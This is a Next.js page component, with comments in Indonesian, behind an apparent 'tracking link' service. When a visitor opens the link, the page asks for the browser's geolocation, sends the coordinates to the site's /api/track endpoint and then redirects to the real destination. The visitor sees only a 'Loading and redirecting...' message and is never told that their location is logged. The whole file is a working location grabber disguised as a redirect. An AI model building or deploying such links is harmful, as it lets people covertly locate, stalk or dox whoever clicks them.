'use client'

import { useEffect } from 'react'
import { useRouter } from 'next/navigation'

export default function TrackPage({ params }: { params: { id: string } }) {
  const router = useRouter()

  useEffect(() => {
    async function handleRedirect() {
      const id = params.id

      // Ambil semua link tracking dari backend (sementara masih pakai memory)
      const res = await fetch('/api/create-link')
      const allLinks = await res.json()

      const destination = allLinks[id]
      if (!destination) {
        alert('Invalid tracking link!')
        return
      }

      // Ambil lokasi pengunjung baru
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
          const lat = position.coords.latitude
          const lon = position.coords.longitude

          fetch('/api/track', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ lat, lon, link: destination })
          }).then(() => {
            // Redirect setelah kirim data
            window.location.href = destination
          })
        }, () => {
          // Gagal dapat lokasi, tetap redirect
          window.location.href = destination
        })
      } else {
        // Browser tidak support, langsung redirect
        window.location.href = destination
      }
    }

    handleRedirect()
  }, [params.id])

  return (
    <div className="flex justify-center items-center min-h-screen text-gray-700 text-lg">
      Loading and redirecting...
    </div>
  )
}
